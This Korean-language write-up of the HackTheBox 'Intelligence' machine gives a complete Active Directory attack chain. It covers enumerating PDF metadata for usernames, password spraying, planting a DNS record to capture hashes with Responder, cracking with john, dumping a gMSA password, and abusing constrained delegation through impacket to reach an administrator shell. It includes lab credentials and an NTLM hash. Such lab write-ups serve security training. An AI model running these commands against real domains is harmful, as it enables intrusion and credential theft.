# Intelligence - HackTheBox
## Recon
```bash
sudo nmap -p 135,139,3268,3269,389,445,464,49667,49691,49692,49708,49723,49742,53,593,636,80,88,9389 -sC -sV -vv -oA intelligence 10.129.95.154
```
<img width="1204" height="401" alt="image" src="https://github.com/user-attachments/assets/38edb469-f950-4a37-a96c-3f61ae36c8b9" />
<img width="1204" height="179" alt="image" src="https://github.com/user-attachments/assets/7d87c548-0c2a-4ce7-8d7e-df8d833d4e25" />

- HTTP(80)
- KERBEROS(88)
- LDAP(389)
- SMB(445)
- CA

<br>

- `/etc/hosts`에 `dc.intelligence.htb` 추가.
<img width="1204" height="71" alt="image" src="https://github.com/user-attachments/assets/27176dbb-4741-4a8e-be5f-bbaf746407ab" />

---
## Auth as Tiffany.Molina
- 메인페이지에서 다운로드 링크 발견.
<img width="1920" height="1051" alt="image" src="https://github.com/user-attachments/assets/3aa87e15-8d65-492f-9c67-e5c48d4c5aeb" />

<br>
<br>

- 각각의 경로가 날짜로 이루어져 있음.
<img width="334" height="37" alt="image" src="https://github.com/user-attachments/assets/d24712cf-4266-40c3-b26b-bf70b50bf156" />
<img width="334" height="37" alt="image" src="https://github.com/user-attachments/assets/dd52d708-92ab-44fd-8c64-e130975d360c" />

<br>
<br>

- 로컬로 다운로드 받아서 METADATA를 확인해보니 유저명이 적혀 있음.
- 다른 파일도 또한 유저명이 적혀 있음.
```bash
wget http://10.129.95.154/documents/2020-01-01-upload.pdf

exiftool 2020-01-01-upload.pdf
```
<img width="1204" height="384" alt="image" src="https://github.com/user-attachments/assets/b9c765d9-549a-4b87-afa1-018c48e33776" />

<br>
<br>

- 날짜를 바꿔서 다운로드를 시도.
```bash
for num in $(seq 0 365);do date=$(date -d "2020-01-01 +$num day" +"%Y-%m-%d");wget "http://10.129.95.154/documents/$date-upload.pdf";done
```
<img width="1204" height="426" alt="image" src="https://github.com/user-attachments/assets/786c403d-d92e-4f72-85e1-2d1af369f2ff" />

<br>
<br>

- 유저 목록 수집한 후 `kerbrute`를 사용하여 유효한 유저목록 확인.
- 수집된 모든 유저들 모두 유효.
```bash
for pdf in $(ls *.pdf);do exiftool $pdf|grep Creator >> users;done

./kerbrute_linux_386 userenum -d intelligence.htb --dc 10.129.95.154 users
```
<img width="1204" height="422" alt="image" src="https://github.com/user-attachments/assets/3b0597de-4378-4975-9308-92e3a2561da2" />

<br>
<br>

- 유저명과 동일한 비밀번호로 로그인 시도하였으나 실패.
- pdf의 텍스트만 수집하여 password에 대한 정보 탐색.
```bash
for pdf in $(ls *.pdf);do pdftotext $pdf;done

grep -r pass
```
<img width="1204" height="120" alt="image" src="https://github.com/user-attachments/assets/64ce7d41-becd-4979-b176-019e63463eed" />

<br>
<br>

- `2020-06-04-upload.txt` 파일에서 비밀번호 발견.
<img width="1204" height="159" alt="image" src="https://github.com/user-attachments/assets/7e34af14-70e5-43de-9fa3-a0c5fb44dfa0" />

<br>
<br>

- `Tiffany.Molina:NewIntelligenceCorpUser9876` 로그인 성공.
```bash
nxc smb 10.129.95.154 -u users -p NewIntelligenceCorpUser9876
```
<img width="1204" height="157" alt="image" src="https://github.com/user-attachments/assets/8196d4e0-e9e3-4f18-a7b0-c758e74507d5" />

---
## Auth as Ted.Graves
- SMB 수집.
```bash
smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H 10.129.95.154
```
<img width="1204" height="223" alt="image" src="https://github.com/user-attachments/assets/5421a02f-67ff-4c5a-9f6f-06a78916da51" />

<br>
<br>

- `/IT`경로에서 `downdetector.ps1` 다운로드.
- DNS를 사용하여 `web`으로 시작되는 도메인 레코드들에 각각에 인증을 사용하여 접속을 시도하는 코드.
<img width="1204" height="317" alt="image" src="https://github.com/user-attachments/assets/76fe2338-46af-49d4-b43e-b571c292581a" />

<br>
<br>

- `dnstool`를 사용하여 DNS 레코드 등록.
```bash
dnstool -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --action add --record web-test --data 10.10.14.23 --type A 10.129.95.154
```
<img width="1204" height="185" alt="image" src="https://github.com/user-attachments/assets/8bd83577-cb8c-475b-a96a-4a3bcfe8e01e" />

<br>
<br>

- `responder`를 사용하여 해시 캡쳐.
- `Ted.Graves` 해시 발견.
```bash
sudo responder -I tun0 -v
```
<img width="1204" height="242" alt="image" src="https://github.com/user-attachments/assets/c78bbed0-75cd-4bfd-bc82-50a45a78c0ff" />

<br>
<br>

- 크래킹 시도.
```bash
john hash --wordlist=~/util/rockyou.txt
```
<img width="1204" height="230" alt="image" src="https://github.com/user-attachments/assets/f544b811-0e43-452e-9a61-344bbc95b4b3" />

<br>
<br>

- 로그인 성공.
```bash
nxc smb 10.129.95.154 -u Ted.Graves -p Mr.Teddy
```
<img width="1204" height="123" alt="image" src="https://github.com/user-attachments/assets/4d5fd266-5842-44fb-ab24-e7d74fc0709e" />

---
## Auth as SVC_INT$
- `bloodhound-python`을 사용하여 수집.
- `ITSUPPORT`그룹에 속해 있어 `ReadGMSAPassword`권한을 사용할 수 있음.
```bash
bloodhound-python -u Ted.Graves -p Mr.Teddy -d intelligence.htb -c all --zip -ns 10.129.95.154
```
<img width="1144" height="342" alt="image" src="https://github.com/user-attachments/assets/1ea78def-1e74-4bd6-9877-bce849ea453d" />

<br>
<br>

- `gMSADumper`를 사용하여 `SVC_INT$` 해시 캡쳐.
```bash
python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb
```
<img width="1205" height="184" alt="image" src="https://github.com/user-attachments/assets/35597b1d-6a9a-4cfa-8157-20194c55443e" />

<br>
<br>

- `svc_int$:0d5463c6e805b0908b61e90cf9219dc3` 로그인 성공.
```bash
nxc smb 10.129.95.154 -u svc_int$ -H 0d5463c6e805b0908b61e90cf9219dc3
```
<img width="1206" height="128" alt="image" src="https://github.com/user-attachments/assets/1db593f7-4f1b-4ed9-9ef3-d25446c89600" />

---
## Privesc
- `SVC_INT$`유저가 `AllowedToDelegate`권한을 사용할 수 있음.
- DC가 `HOST SPN`을 가지고 있어 `WWW` 혹은 `HTTP` SPN을 요청 가능.
<img width="453" height="613" alt="image" src="https://github.com/user-attachments/assets/f684bad8-5945-4d27-aa33-cb8b2c38864f" />

<br>
<br>

- `getST`를 사용하여 티켓 요청.
```bash
impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate administrator -altservice 'cifs' -hashes :0d5463c6e805b0908b61e90cf9219dc3 intelligence.htb/'svc_int$'
```
<img width="1206" height="271" alt="image" src="https://github.com/user-attachments/assets/edb22430-c521-4a2b-9566-ba699987dd59" />

<br>
<br>

- 티켓을 사용하여 셸 획득.
```bash
impacket-psexec -k -no-pass intelligence.htb/administrator@dc.intelligence.htb
```
<img width="1206" height="357" alt="image" src="https://github.com/user-attachments/assets/ca54ed32-a8c7-4a3d-a746-52c6f58235f3" />

---
## FLAG
- `c:\users\tiffany.molina\desktop\user.txt`
<img width="1206" height="248" alt="image" src="https://github.com/user-attachments/assets/a9127484-421b-4f84-959e-35ec999d5368" />

<br>
<br>

- `c:\users\administator\desktop\root.txt`
<img width="1206" height="161" alt="image" src="https://github.com/user-attachments/assets/353bbd07-50f6-4d30-af7d-874c782a9e49" />
